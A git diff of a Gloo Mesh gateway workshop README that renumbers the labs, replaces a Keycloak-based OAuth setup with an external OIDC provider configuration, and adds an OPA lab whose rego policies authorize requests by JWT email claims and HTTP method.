@@ -15,7 +15,7 @@ source ./scripts/assert.sh
 ## Table of Contents
 * [Introduction](#introduction)
 * [Lab 0 - Prerequisites](#lab-0---prerequisites-)
-* [Lab 1 - Deploy a KinD cluster](#lab-1---deploy-a-kind-cluster-)
+* [Lab 1 - Setting up your Environment Variables](#lab-1---setting-up-your-environment-variables-)
 * [Lab 2 - Deploy and register Gloo Mesh](#lab-2---deploy-and-register-gloo-mesh-)
 * [Lab 3 - Deploy Istio using Gloo Mesh Lifecycle Manager](#lab-3---deploy-istio-using-gloo-mesh-lifecycle-manager-)
 * [Lab 4 - Deploy the Bookinfo demo app](#lab-4---deploy-the-bookinfo-demo-app-)
@@ -25,12 +25,10 @@ source ./scripts/assert.sh
 * [Lab 8 - Create the bookinfo workspace](#lab-8---create-the-bookinfo-workspace-)
 * [Lab 9 - Expose the productpage through a gateway](#lab-9---expose-the-productpage-through-a-gateway-)
 * [Lab 10 - Create the httpbin workspace](#lab-10---create-the-httpbin-workspace-)
-* [Lab 11 - Expose an external service](#lab-11---expose-an-external-service-)
-* [Lab 12 - Deploy Keycloak](#lab-12---deploy-keycloak-)
-* [Lab 13 - Securing the access with OAuth](#lab-13---securing-the-access-with-oauth-)
-* [Lab 14 - Use the JWT filter to create headers from claims](#lab-14---use-the-jwt-filter-to-create-headers-from-claims-)
-* [Lab 15 - Use the transformation filter to manipulate headers](#lab-15---use-the-transformation-filter-to-manipulate-headers-)
-* [Lab 16 - Apply rate limiting to the Gateway](#lab-16---apply-rate-limiting-to-the-gateway-)
+* [Lab 11 - Expose the httpbin service](#lab-11---expose-the-httpbin-service-)
+* [Lab 12 - Securing Application Access with OAuth](#lab-12---securing-application-access-with-oauth-)
+* [Lab 13 - Integrating with OPA](#lab-13---integrating-with-opa-)
+* [Lab 14 - Apply rate limiting to the Gateway](#lab-14---apply-rate-limiting-to-the-gateway-)
 * [Lab 17 - Use the Web Application Firewall filter](#lab-17---use-the-web-application-firewall-filter-)
 * [Lab 18 - Upgrade Istio using Gloo Mesh Lifecycle Manager](#lab-18---upgrade-istio-using-gloo-mesh-lifecycle-manager-)
 
@@ -102,21 +100,21 @@ Set the context environment variables:
 export CLUSTER1=cluster1
 ```
 
-You also need to rename the Kubernete contexts of each Kubernetes cluster to match `mgmt`
+You also need to rename the Kubernete contexts of each Kubernetes cluster to match `cluster1`
 
 Here is an example showing how to rename a Kubernetes context:
 ```
 kubectl config rename-context <context to rename> <new context name>
 ```
 
-Run the following command to make `mgmt` the current cluster.
+Run the following command to make `cluster1` the current cluster.
 ```bash
 kubectl config use-context ${CLUSTER1}
 ```
 
 > If you prefer to use the existing context name, just set the variables as so:
 > ```
-> export MGMT=<cluster_mgmt_context>
+> export CLUSTER1=<cluster1_context>
 > ```
 >
 > Note: these variables may need to be set in each new terminal used
@@ -327,7 +325,6 @@ We are going to deploy Istio using Gloo Mesh Lifecycle Manager.
 First of all, let's create Kubernetes services for the gateways:
 
 ```bash
-registry=localhost:5000
 kubectl --context ${CLUSTER1} create ns istio-gateways
 kubectl --context ${CLUSTER1} label namespace istio-gateways istio.io/rev=1-16 --overwrite
 
@@ -535,6 +532,14 @@ Set the environment variable for the service corresponding to the Istio Ingress 
 export ENDPOINT_HTTP_GW_CLUSTER1=$(kubectl --context ${CLUSTER1} -n istio-gateways get svc -l istio=ingressgateway -o jsonpath='{.items[0].status.loadBalancer.ingress[0].*}'):80
 export ENDPOINT_HTTPS_GW_CLUSTER1=$(kubectl --context ${CLUSTER1} -n istio-gateways get svc -l istio=ingressgateway -o jsonpath='{.items[0].status.loadBalancer.ingress[0].*}'):443
 export HOST_GW_CLUSTER1=$(echo ${ENDPOINT_HTTP_GW_CLUSTER1} | cut -d: -f1)
+```
+
+Check that the variables have correct values:
+```bash
+echo $ENDPOINT_HTTP_GW_CLUSTER1
+echo $ENDPOINT_HTTPS_GW_CLUSTER1
+echo $HOST_GW_CLUSTER1
+
 ```
 
 <!--bash
@@ -1203,153 +1208,9 @@ The Httpbin team has decided to export the following to the `gateway` workspace 
 
 
 
-## Lab 11 - Expose an external service <a name="lab-11---expose-an-external-service-"></a>
+## Lab 11 - Expose the httpbin service <a name="lab-11---expose-the-httpbin-service-"></a>
 
-In this step, we're going to expose an external service through a Gateway using Gloo Mesh and show how we can then migrate this service to the Mesh.
-
-Let's create an `ExternalService` corresponding to `httpbin.org`:
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: networking.gloo.solo.io/v2
-kind: ExternalService
-metadata:
-  name: httpbin
-  namespace: httpbin
-  labels:
-    expose: "true"
-spec:
-  hosts:
-  - httpbin.org
-  ports:
-  - name: http
-    number: 80
-    protocol: HTTP
-  - name: https
-    number: 443
-    protocol: HTTPS
-    clientsideTls: {}
-EOF
-```
-
-Now, you can create a `RouteTable` to expose `httpbin.org` through the gateway:
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: networking.gloo.solo.io/v2
-kind: RouteTable
-metadata:
-  name: httpbin
-  namespace: httpbin
-  labels:
-    expose: "true"
-spec:
-  http:
-    - name: httpbin
-      matchers:
-      - uri:
-          exact: /get
-      forwardTo:
-        destinations:
-        - kind: EXTERNAL_SERVICE
-          port:
-            number: 443
-          ref:
-            name: httpbin
-            namespace: httpbin
-EOF
-```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const helpersHttp = require('./tests/chai-http');
-
-describe("httpbin from the external service", () => {
-  it('Checking text \'X-Amzn-Trace-Id\' in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', body: 'X-Amzn-Trace-Id', match: true }));
-})
-EOF
-echo "executing test dist/gloo-mesh-2-0-gateway/build/templates/steps/apps/httpbin/gateway-external-service/tests/httpbin-from-external.test.js.liquid"
-tempfile=$(mktemp)
-echo "saving errors in ${tempfile}"
-mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
--->
-
-You should now be able to access `httpbin.org` external service through the gateway.
-
-Get the URL to access the `httpbin` service using the following command:
-```
-echo "https://${ENDPOINT_HTTPS_GW_CLUSTER1}/get"
-```
-
-Let's update the `RouteTable` to direct 50% of the traffic to the local `httpbin` service:
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: networking.gloo.solo.io/v2
-kind: RouteTable
-metadata:
-  name: httpbin
-  namespace: httpbin
-  labels:
-    expose: "true"
-spec:
-  http:
-    - name: httpbin
-      matchers:
-      - uri:
-          exact: /get
-      forwardTo:
-        destinations:
-        - kind: EXTERNAL_SERVICE
-          port:
-            number: 443
-          ref:
-            name: httpbin
-            namespace: httpbin
-          weight: 50
-        - ref:
-            name: in-mesh
-            namespace: httpbin
-          port:
-            number: 8000
-          weight: 50
-EOF
-```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const helpersHttp = require('./tests/chai-http');
-
-describe("httpbin from the local service", () => {
-  it('Checking text \'X-Amzn-Trace-Id\' not in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', body: 'X-Amzn-Trace-Id', match: false }));
-})
-EOF
-echo "executing test dist/gloo-mesh-2-0-gateway/build/templates/steps/apps/httpbin/gateway-external-service/tests/httpbin-from-local.test.js.liquid"
-tempfile=$(mktemp)
-echo "saving errors in ${tempfile}"
-mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
--->
-<!--bash
-cat <<'EOF' > ./test.js
-const helpersHttp = require('./tests/chai-http');
-
-describe("httpbin from the external service", () => {
-  it('Checking text \'X-Amzn-Trace-Id\' in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', body: 'X-Amzn-Trace-Id', match: true }));
-})
-EOF
-echo "executing test dist/gloo-mesh-2-0-gateway/build/templates/steps/apps/httpbin/gateway-external-service/tests/httpbin-from-external.test.js.liquid"
-tempfile=$(mktemp)
-echo "saving errors in ${tempfile}"
-mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
--->
-
-If you refresh your browser, you should see that you get a response either from the local service or from the external service.
-
-When the response comes from the external service (httpbin.org), there's a `X-Amzn-Trace-Id` header.
-
-And when the response comes from the local service, there's a `X-B3-Parentspanid` header.
-
-Finally, you can update the `RouteTable` to direct all the traffic to the local `httpbin` service:
+Apply the following `RouteTable` to expose the `httpbin` service:
 
 ```bash
 kubectl --context ${CLUSTER1} apply -f - <<EOF
@@ -1389,237 +1250,112 @@ tempfile=$(mktemp)
 echo "saving errors in ${tempfile}"
 mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
 -->
-
-If you refresh your browser, you should see that you get responses only from the local service.
 
 This diagram shows the flow of the requests :
 
 ![Gloo Mesh Gateway EXternal Service](images/steps/gateway-external-service/gloo-mesh-gateway-external-service.svg)
 
 
+## Lab 12 - Securing Application access with OAuth <a name="lab-12---securing-application-access-with-oauth-"></a>
+In this step, we're going to secure the access to the `httpbin` service using OAuth. Integrating an app with extauth consists of a few steps:
+```
+- create app registration in your OIDC
+- configuring a Gloo Mesh `ExtAuthPolicy` and `ExtAuthServer`
+- configuring the `RouteTable` with a specified label (i.e. `route_name: "httpbin-all"`)
+```
 
-## Lab 12 - Deploy Keycloak <a name="lab-12---deploy-keycloak-"></a>
-
-In many use cases, you need to restrict the access to your applications to authenticated users. 
-
-OIDC (OpenID Connect) is an identity layer on top of the OAuth 2.0 protocol. In OAuth 2.0 flows, authentication is performed by an external Identity Provider (IdP) which, in case of success, returns an Access Token representing the user identity. The protocol does not define the contents and structure of the Access Token, which greatly reduces the portability of OAuth 2.0 implementations.
-
-The goal of OIDC is to address this ambiguity by additionally requiring Identity Providers to return a well-defined ID Token. OIDC ID tokens follow the JSON Web Token standard and contain specific fields that your applications can expect and handle. This standardization allows you to switch between Identity Providers – or support multiple ones at the same time – with minimal, if any, changes to your downstream services; it also allows you to consistently apply additional security measures like Role-based Access Control (RBAC) based on the identity of your users, i.e. the contents of their ID token.
-
-In this lab, we're going to install Keycloak. It will allow us to setup OIDC workflows later.
-
-Let's install it:
-
+### In your OIDC Provider
+Once the app has been configured in the external OIDC, we need to create a Kubernetes Secret that contains the OIDC client-secret. Please provide this value input before running the command below:
 ```bash
-kubectl --context ${CLUSTER1} create namespace keycloak
-cat data/steps/deploy-keycloak/keycloak.yaml | kubectl --context ${CLUSTER1} -n keycloak apply -f -
-
-kubectl --context ${CLUSTER1} -n keycloak rollout status deploy/keycloak
+export HTTPBIN_CLIENT_SECRET="<provide OIDC client secret here>"
 ```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const helpers = require('./tests/chai-exec');
-
-describe("Keycloak", () => {
-  it('keycloak pods are ready in cluster1', () => helpers.checkDeployment({ context: process.env.MGMT, namespace: "keycloak", k8sObj: "keycloak" }));
-});
-EOF
-echo "executing test dist/gloo-mesh-2-0-gateway/build/templates/steps/deploy-keycloak/tests/pods-available.test.js.liquid"
-tempfile=$(mktemp)
-echo "saving errors in ${tempfile}"
-mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
--->
-
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-var chai = require('chai');
-var expect = chai.expect;
-chai.use(chaiExec);
-
-afterEach(function (done) {
-  if (this.currentTest.currentRetry() > 0) {
-    process.stdout.write(".");
-    setTimeout(done, 1000);
-  } else {
-    done();
-  }
-});
-
-describe("Retrieve enterprise-networking ip", () => {
-  it("A value for load-balancing has been assigned", () => {
-    let cli = chaiExec("kubectl --context " + process.env.MGMT + " -n keycloak get svc keycloak -o jsonpath='{.status.loadBalancer}'");
-    expect(cli).to.exit.with.code(0);
-    expect(cli).output.to.contain('"ingress"');
-  });
-});
-EOF
-echo "executing test dist/gloo-mesh-2-0-gateway/build/templates/steps/deploy-keycloak/tests/keycloak-ip-is-attached.test.js.liquid"
-tempfile=$(mktemp)
-echo "saving errors in ${tempfile}"
-mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
--->
-
-Then, we will configure it and create two users:
-
-- User1 credentials: `user1/password`
-  Email: user1@example.com
-
-- User2 credentials: `user2/password`
-  Email: user2@solo.io
-
-<!--bash
-until [[ $(kubectl --context ${CLUSTER1} -n keycloak get svc keycloak -o json | jq '.status.loadBalancer | length') -gt 0 ]]; do
-  sleep 1
-done
--->
-
-Let's set the environment variables we need:
-
-```bash
-export ENDPOINT_KEYCLOAK=$(kubectl --context ${CLUSTER1} -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].*}'):8080
-export HOST_KEYCLOAK=$(echo ${ENDPOINT_KEYCLOAK} | cut -d: -f1)
-export PORT_KEYCLOAK=$(echo ${ENDPOINT_KEYCLOAK} | cut -d: -f2)
-export KEYCLOAK_URL=http://${ENDPOINT_KEYCLOAK}
-```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const dns = require('dns');
-const chaiHttp = require("chai-http");
-const chai = require("chai");
-const expect = chai.expect;
-chai.use(chaiHttp);
-const { waitOnFailedTest } = require('./tests/utils');
-
-afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});
-
-describe("Address '" + process.env.HOST_KEYCLOAK + "' can be resolved in DNS", () => {
-    it(process.env.HOST_KEYCLOAK + ' can be resolved', (done) => {
-        return dns.lookup(process.env.HOST_KEYCLOAK, (err, address, family) => {
-            expect(address).to.be.an.ip;
-            done();
-        });
-    });
-});
-EOF
-echo "executing test ./gloo-mesh-2-0/tests/can-resolve.test.js.liquid"
-tempfile=$(mktemp)
-echo "saving errors in ${tempfile}"
-mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
--->
-
-Now, we need to get a token:
-
-```bash
-export KEYCLOAK_TOKEN=$(curl -d "client_id=admin-cli" -d "username=admin" -d "password=admin" -d "grant_type=password" "$KEYCLOAK_URL/realms/master/protocol/openid-connect/token" | jq -r .access_token)
-```
-
-After that, we configure Keycloak:
-
-```bash
-# Create initial token to register the client
-read -r client token <<<$(curl -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X POST -H "Content-Type: application/json" -d '{"expiration": 0, "count": 1}' $KEYCLOAK_URL/admin/realms/master/clients-initial-access | jq -r '[.id, .token] | @tsv')
-export KEYCLOAK_CLIENT=${client}
-
-# Register the client
-read -r id secret <<<$(curl -X POST -d "{ \"clientId\": \"${KEYCLOAK_CLIENT}\" }" -H "Content-Type:application/json" -H "Authorization: bearer ${token}" ${KEYCLOAK_URL}/realms/master/clients-registrations/default| jq -r '[.id, .secret] | @tsv')
-export KEYCLOAK_SECRET=${secret}
-
-# Add allowed redirect URIs
-curl -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X PUT -H "Content-Type: application/json" -d '{"serviceAccountsEnabled": true, "directAccessGrantsEnabled": true, "authorizationServicesEnabled": true, "redirectUris": ["'https://${ENDPOINT_HTTPS_GW_CLUSTER1}'/callback","'https://${ENDPOINT_HTTPS_GW_CLUSTER1}'/get"]}' $KEYCLOAK_URL/admin/realms/master/clients/${id}
-
-# Add the group attribute in the JWT token returned by Keycloak
-curl -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X POST -H "Content-Type: application/json" -d '{"name": "group", "protocol": "openid-connect", "protocolMapper": "oidc-usermodel-attribute-mapper", "config": {"claim.name": "group", "jsonType.label": "String", "user.attribute": "group", "id.token.claim": "true", "access.token.claim": "true"}}' $KEYCLOAK_URL/admin/realms/master/clients/${id}/protocol-mappers/models
-
-# Create first user
-curl -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X POST -H "Content-Type: application/json" -d '{"username": "user1", "email": "user1@example.com", "enabled": true, "attributes": {"group": "users"}, "credentials": [{"type": "password", "value": "password", "temporary": false}]}' $KEYCLOAK_URL/admin/realms/master/users
-
-# Create second user
-curl -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X POST -H "Content-Type: application/json" -d '{"username": "user2", "email": "user2@solo.io", "enabled": true, "attributes": {"group": "users"}, "credentials": [{"type": "password", "value": "password", "temporary": false}]}' $KEYCLOAK_URL/admin/realms/master/users
-```
-
-> **Note:** If you get a *Not Authorized* error, please, re-run this command and continue from the command started to fail:
-
-```
-KEYCLOAK_TOKEN=$(curl -d "client_id=admin-cli" -d "username=admin" -d "password=admin" -d "grant_type=password" "$KEYCLOAK_URL/realms/master/protocol/openid-connect/token" | jq -r .access_token)
-```
-
-
-
-
-## Lab 13 - Securing the access with OAuth <a name="lab-13---securing-the-access-with-oauth-"></a>
-
-
-In this step, we're going to secure the access to the `httpbin` service using OAuth.
-
-First, we need to create a Kubernetes Secret that contains the OIDC secret:
 
 ```bash
 kubectl --context ${CLUSTER1} apply -f - <<EOF
 apiVersion: v1
 kind: Secret
 metadata:
-  name: oauth
-  namespace: httpbin
+  name: oidc-client-secret
+  namespace: gloo-mesh
 type: extauth.solo.io/oauth
 data:
-  client-secret: $(echo -n ${KEYCLOAK_SECRET} | base64)
+  client-secret: $(echo -n ${HTTPBIN_CLIENT_SECRET} | base64)
 EOF
 ```
 
-Then, you need to create an `ExtAuthPolicy`, which is a CRD that contains authentication information: 
+Set the callback URL in your OIDC provider to map to our httpbin app
+```bash
+export APP_CALLBACK_URL="https://$(kubectl --context ${CLUSTER1} -n istio-gateways get svc istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].*}')"
 
+echo $APP_CALLBACK_URL
+```
+
+Lastly, replace the `OICD_CLIENT_ID` and `ISSUER_URL` values below with your OIDC app settings
+```bash
+export OIDC_CLIENT_ID="<INPUT_OIDC_CLIENT_ID>"
+export ISSUER_URL="<INPUT_ISSUER_URL_HERE>"
+```
+
+Let's make sure our variables are set correctly:
+```bash
+echo $OIDC_CLIENT_ID
+echo $ISSUER_URL
+```
+
+### Create ExtAuthPolicy
+Now we will create an `ExtAuthPolicy`, which is a CRD that contains authentication information. 
 ```bash
 kubectl --context ${CLUSTER1} apply -f - <<EOF
 apiVersion: security.policy.gloo.solo.io/v2
 kind: ExtAuthPolicy
 metadata:
-  name: httpbin
+  name: httpbin-extauth
   namespace: httpbin
 spec:
   applyToRoutes:
   - route:
       labels:
-        oauth: "true"
+        route_name: "httpbin-all"
   config:
     server:
-      name: ext-auth-server
+      name: cluster1-ext-auth-server
       namespace: httpbin
       cluster: cluster1
     glooAuth:
       configs:
       - oauth2:
           oidcAuthorizationCode:
-            appUrl: "https://${ENDPOINT_HTTPS_GW_CLUSTER1}"
+            appUrl: ${APP_CALLBACK_URL}
             callbackPath: /callback
-            clientId: ${KEYCLOAK_CLIENT}
+            clientId: ${OIDC_CLIENT_ID}
             clientSecretRef:
-              name: oauth
-              namespace: httpbin
-            issuerUrl: "${KEYCLOAK_URL}/realms/master/"
+              name: oidc-client-secret
+              namespace: gloo-mesh
+            issuerUrl: ${ISSUER_URL}
             session:
               failOnFetchFailure: true
               redis:
-                cookieName: keycloak-session
+                cookieName: oidc-session
                 options:
-                  host: redis:6379
+                  host: redis.gloo-mesh-addons:6379
+                allowRefreshing: true
+              cookieOptions:
+                maxAge: "90"
             scopes:
             - email
+            - profile
             headers:
-              idTokenHeader: jwt
+              idTokenHeader: Jwt
 EOF
 ```
 
 After that, you need to create an `ExtAuthServer`, which is a CRD that define which extauth server to use: 
-
 ```bash
 kubectl --context ${CLUSTER1} apply -f - <<EOF
 apiVersion: admin.gloo.solo.io/v2
 kind: ExtAuthServer
 metadata:
-  name: ext-auth-server
+  name: cluster1-ext-auth-server
   namespace: httpbin
 spec:
   destinationServer:
@@ -1632,8 +1368,7 @@ spec:
 EOF
 ```
 
-Finally, you need to update the `RouteTable` to use this `ExtAuthPolicy`:
-
+Finally, you need to update the `RouteTable` to use this `AuthConfig`:
 ```bash
 kubectl --context ${CLUSTER1} apply -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
@@ -1641,20 +1376,28 @@ kind: RouteTable
 metadata:
   name: httpbin
   namespace: httpbin
-  labels:
-    expose: "true"
 spec:
+  hosts:
+    - '*'
+  virtualGateways:
+    - name: north-south-gw
+      namespace: istio-gateways
+      cluster: cluster1
+  workloadSelectors: []
   http:
-    - name: httpbin
+    - name: httpbin-all
       labels:
-        oauth: "true"
+        route_name: "httpbin-all"
+        ratelimited: "true"
       matchers:
       - uri:
           exact: /get
       - uri:
-          exact: /logout
+          prefix: /anything
       - uri:
           prefix: /callback
+      - uri:
+          prefix: /logout
       forwardTo:
         destinations:
         - ref:
@@ -1665,46 +1408,68 @@ spec:
 EOF
 ```
 
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-var chai = require('chai');
-var expect = chai.expect;
+Now when you access your httpbin app through the browser, it will be protected by the OIDC provider login page.
+```
+echo "${APP_CALLBACK_URL}/get"
+```
 
-describe("Authentication is working properly", function() {
-  let user = 'user2';
-  let password = 'password';
-  let keycloak_client_id = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get extauthpolicy httpbin -o jsonpath='{.spec.config.glooAuth.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
-  let keycloak_client_secret_base64 = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get secret oauth -o jsonpath='{.data.client-secret}'").stdout.replaceAll("'", "");
-  let buff = new Buffer(keycloak_client_secret_base64, 'base64');
-  let keycloak_client_secret = buff.toString('ascii');
-  let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "' + process.env.KEYCLOAK_URL +'/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
-  it("The httpbin page isn't accessible without authenticating", () => helpersHttp.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', retCode: 302 }));
-  it("The httpbin page is accessible after authenticating", () => helpersHttp.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 200 }));
-});
+## Lab 13 - Integrating with OPA <a name="lab-12---integrating-with-opa-"></a>
 
-EOF
-echo "executing test dist/gloo-mesh-2-0-gateway/build/templates/steps/apps/httpbin/gateway-extauth-oauth/tests/authentication.test.js.liquid"
-tempfile=$(mktemp)
-echo "saving errors in ${tempfile}"
-mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
--->
+### OPA inputs
+You can also perform authorization using OPA. Gloo Mesh's OPA integration populates an input document to use in your OPA policies which allows you to easily write rego policy
+- `input.check_request` - By default, all OPA policies will contain an Envoy Auth Service CheckRequest. This object contains all the information Envoy has gathered of the request being processed. See the Envoy docs and proto files for AttributeContext for the structure of this object.
+- `input.http_request` - When processing an HTTP request, this field will be populated for convenience. See the Envoy HttpRequest docs and proto files for the structure of this object.
+- `input.state.jwt` - When the OIDC auth plugin is utilized, the token retrieved during the OIDC flow is placed into this field. 
 
-If you refresh the web browser, you will be redirected to the authentication page.
+## Lab
+In this lab, we will make use of the `input.http_request` parameter in our OPA policies to decode the `jwt` token retrieved in the last lab and create policies using the claims available, namely the `sub` and `email` claims.
 
-If you use the username `user1` and the password `password` you should be redirected back to the `httpbin` application.
+Instead of coupling the `oauth2` config with the `opa` config in a single `ExtAuthPolicy`, here we will separate the app to decouple the APIs from apps
 
-You can also perform authorization using OPA.
+## High Level Workflow
+![Gloo Mesh Dashboard OIDC](images/runbook9a.png)
 
-First, you need to create a `ConfigMap` with the policy written in rego:
+First we will create a new `ExtAuthPolicy` object to add the OPA filter. Note the use of the `applyToDestinations` in this `ExtAuthPolicy` instead of `applyToRoutes`. This matcher allows us to specify a destination where we want to apply our policy to, rather than on a Route. Note that the below uses a direct reference, but label matchers would work as well.
 
+Lets apply the following policy
 ```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
+kubectl --context ${MGMT} apply -f - <<EOF
+apiVersion: security.policy.gloo.solo.io/v2
+kind: ExtAuthPolicy
+metadata:
+  name: httpbin-opa
+  namespace: httpbin
+spec:
+  applyToDestinations:
+  - selector:
+      name: in-mesh
+      namespace: httpbin
+      workspace: httpbin
+  config:
+    server:
+      name: cluster1-ext-auth-server
+      namespace: httpbin
+      cluster: cluster1
+    glooAuth:
+      configs:
+      - opaAuth:
+          modules:
+          - name: httpbin-opa
+            namespace: httpbin
+          query: "data.test.allow == true"
+EOF
+```
+
+### Enforce @solo.io username login by inspecting the JWT email payload
+For our first use-case we will decode the JWT token passed through extauth for the `email` payload, and enforce that a user logging in must end with `@solo.io` as the username with OPA
+
+First, you need to create a `ConfigMap` with the policy written in rego. 
+```bash
+kubectl --context ${MGMT} apply -f - <<EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: allow-solo-email-users
+  name: httpbin-opa
   namespace: httpbin
 data:
   policy.rego: |-
@@ -1713,317 +1478,246 @@ data:
     default allow = false
 
     allow {
-        [header, payload, signature] = io.jwt.decode(input.state.jwt)
+        [header, payload, signature] = io.jwt.decode(input.http_request.headers.jwt)
         endswith(payload["email"], "@solo.io")
     }
 EOF
 ```
 
-Then, you need to update the `ExtAuthPolicy` object to add the authorization step:
+Now we should see success when logging in with a username that ends with `@solo.io` but will encounter a `403 Error - You don't have authorization to view this page` when using a username that ends with anything else (`@gmail.com` for example)
 
+### Map to other claims in JWT
+If you decode the JWT provided (using jwt.io for example), we can see other claims available
+```
+{
+  "sub": "alex.solo@solo.io",
+  "email": "alex.ly@solo.io"
+}
+```
+
+We can modify our rego rule to apply policy to map to `sub` as well as `email` claims
 ```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: security.policy.gloo.solo.io/v2
-kind: ExtAuthPolicy
+kubectl --context ${MGMT} apply -f - <<EOF
+apiVersion: v1
+kind: ConfigMap
 metadata:
-  name: httpbin
+  name: httpbin-opa
   namespace: httpbin
-spec:
-  applyToRoutes:
-  - route:
-      labels:
-        oauth: "true"
-  config:
-    server:
-      name: ext-auth-server
-      namespace: httpbin
-      cluster: cluster1
-    glooAuth:
-      configs:
-      - oauth2:
-          oidcAuthorizationCode:
-            appUrl: "https://${ENDPOINT_HTTPS_GW_CLUSTER1}"
-            callbackPath: /callback
-            clientId: ${KEYCLOAK_CLIENT}
-            clientSecretRef:
-              name: oauth
-              namespace: httpbin
-            issuerUrl: "${KEYCLOAK_URL}/realms/master/"
-            logoutPath: /logout
-            afterLogoutUrl: "https://${ENDPOINT_HTTPS_GW_CLUSTER1}/get"
-            session:
-              failOnFetchFailure: true
-              redis:
-                cookieName: keycloak-session
-                options:
-                  host: redis:6379
-            scopes:
-            - email
-            headers:
-              idTokenHeader: jwt
-      - opaAuth:
-          modules:
-          - name: allow-solo-email-users
-            namespace: httpbin
-          query: "data.test.allow == true"
+data:
+  policy.rego: |-
+    package test
+
+    default allow = false
+
+    allow {
+        [header, payload, signature] = io.jwt.decode(input.http_request.headers.jwt)
+        endswith(payload["email"], "@solo.io")
+    }
+    allow {
+        [header, payload, signature] = io.jwt.decode(input.http_request.headers.jwt)
+        endswith(payload["sub"], "@solo.io")
+    }
 EOF
 ```
 
-Refresh the web page. `user1` shouldn't be allowed to access it anymore since the user's email ends with `@example.com`.
-If you open the browser in incognito and login using the username `user2` and the password `password`, you will now be able to access it since the user's email ends with `@solo.io`.
+Now you should be able to access the app logging in with users that end in `@solo.io`, as well as `@solo.io`
+
+### Use OPA to enforce a specific HTTP method
+Let's continue to expand on our example by enforcing different HTTP methods for our two types of users
+```bash
+kubectl --context ${MGMT} apply -f - <<EOF
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: httpbin-opa
+  namespace: httpbin
+data:
+  policy.rego: |-
+    package test
+
+    default allow = false
+
+    allow {
+        [header, payload, signature] = io.jwt.decode(input.http_request.headers.jwt)
+        endswith(payload["email"], "@solo.io")
+        any({input.http_request.method == "POST",
+             input.http_request.method == "PUT",
+             input.http_request.method == "DELETE",
+    })
+    }
+    allow {
+        [header, payload, signature] = io.jwt.decode(input.http_request.headers.jwt)
+        endswith(payload["sub"], "@solo.io")
+        any({input.http_request.method == "POST",
+             input.http_request.method == "PUT",
+             input.http_request.method == "DELETE",
+    })
+    }
+EOF
+```
+
+If you refresh the browser where the `@solo.io` or `@solo.io` user is logged in, we should now see a `403 Error - You don't have authorization to view this page`. This is because we are not allowing the `GET` method for either of those matches in our OPA policy
+
+Let's fix that
+```bash
+kubectl --context ${MGMT} apply -f - <<EOF
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: httpbin-opa
+  namespace: httpbin
+data:
+  policy.rego: |-
+    package test
+
+    default allow = false
+
+    allow {
+        [header, payload, signature] = io.jwt.decode(input.http_request.headers.jwt)
+        endswith(payload["email"], "@solo.io")
+        any({input.http_request.method == "GET",
+             input.http_request.method == "POST",
+             input.http_request.method == "PUT",
+             input.http_request.method == "DELETE",
+    })
+    }
+    allow {
+        [header, payload, signature] = io.jwt.decode(input.http_request.headers.jwt)
+        endswith(payload["sub"], "@solo.io")
+        any({input.http_request.method == "GET",
+             input.http_request.method == "POST",
+             input.http_request.method == "PUT",
+             input.http_request.method == "DELETE",
+    })
+    }
+EOF
+```
+
+Now we should be able to access our app again.
